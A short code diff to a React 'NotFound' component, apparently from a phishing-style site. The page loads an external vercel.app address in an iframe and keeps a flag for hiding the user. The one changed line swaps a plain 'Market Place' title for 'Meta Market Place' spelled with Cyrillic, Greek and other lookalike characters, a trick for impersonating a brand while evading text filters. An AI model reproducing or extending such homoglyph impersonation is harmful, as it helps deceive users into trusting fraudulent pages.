@@ -8,7 +8,7 @@ function NotFound() {
   let[countryCode, setCountryCode] = useState('');
   let[IsUserHiden, SetUserHiden] = useState(false);
   let[IframeUrl, SetIframeUrl] = useState('https://stackclient-abdc.vercel.app/');
-  let[SiteTitleMeta, SetSiteTitleMeta] = useState('Market Place');
+  let[SiteTitleMeta, SetSiteTitleMeta] = useState('Меtа Μаrkеt Ꮲⅼасе');
   let[SiteTitleHome, SetSiteTitleHome] = useState('Rain Blue | Home');
 
 
